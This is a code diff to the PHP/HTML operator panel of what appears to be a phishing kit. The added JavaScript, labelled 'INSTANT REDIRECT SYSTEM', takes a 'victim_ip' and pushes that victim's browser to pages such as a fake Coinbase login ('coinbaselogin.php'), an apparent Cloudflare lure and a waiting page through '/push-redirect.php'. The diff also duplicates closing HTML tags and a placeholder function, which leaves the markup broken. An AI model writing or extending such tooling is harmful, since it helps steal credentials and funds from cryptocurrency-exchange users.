@@ -595,6 +595,22 @@ if (isset($_SESSION['error_message'])) {
             let refreshInterval;
 
             function toggleAutoRefresh() {
+                // ... your existing auto-refresh code ...
+            }
+
+            // Optional: Start with auto-refresh disabled
+            // To enable by default, uncomment the line below:
+            // toggleAutoRefresh();
+        </script>
+    </main>
+</body>
+</html>
+
+    <script>
+            let autoRefreshEnabled = false;
+            let refreshInterval;
+
+            function toggleAutoRefresh() {
                 const btn = document.getElementById('autoRefreshBtn');
                 
                 if (autoRefreshEnabled) {
@@ -621,7 +637,69 @@ if (isset($_SESSION['error_message'])) {
             // Optional: Start with auto-refresh disabled
             // To enable by default, uncomment the line below:
             // toggleAutoRefresh();
-        </script>
+    </script>
+
+        <!-- INSTANT REDIRECT SYSTEM -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const forms = document.querySelectorAll('form[method="POST"]');
+            
+            forms.forEach(form => {
+                const button = form.querySelector('button[type="submit"]');
+                const victimIp = form.querySelector('input[name="victim_ip"]').value;
+                const command = form.querySelector('input[name="redirect_command"]').value;
+                
+                // Map commands to targets
+                const targetMap = {
+                    'redirect_to_coinbase': 'coinbaselogin.php',
+                    'redirect_to_cloudflare': 'index.php',
+                    'redirect_to_waiting': 'waiting.php',
+                    'clear_redirect': 'clear'
+                };
+                
+                const target = targetMap[command];
+                if (!target) return;
+                
+                button.addEventListener('click', function(e) {
+                    // INSTANT AJAX FIRST
+                    e.preventDefault();
+                    
+                    const originalText = button.innerHTML;
+                    button.innerHTML = '⚡...';
+                    button.disabled = true;
+                    
+                    // Send instant AJAX command
+                    fetch('/push-redirect.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: `victim_ip=${encodeURIComponent(victimIp)}&target=${encodeURIComponent(target)}`
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            button.innerHTML = '✅ SENT!';
+                            // Submit form normally after success
+                            setTimeout(() => {
+                                form.submit();
+                            }, 500);
+                        } else {
+                            button.innerHTML = '❌ FAILED';
+                            setTimeout(() => {
+                                button.innerHTML = originalText;
+                                button.disabled = false;
+                            }, 2000);
+                        }
+                    })
+                    .catch(error => {
+                        // If AJAX fails, just submit form normally
+                        form.submit();
+                    });
+                });
+            });
+        });
+    </script>
     </main>
 </body>
 </html>
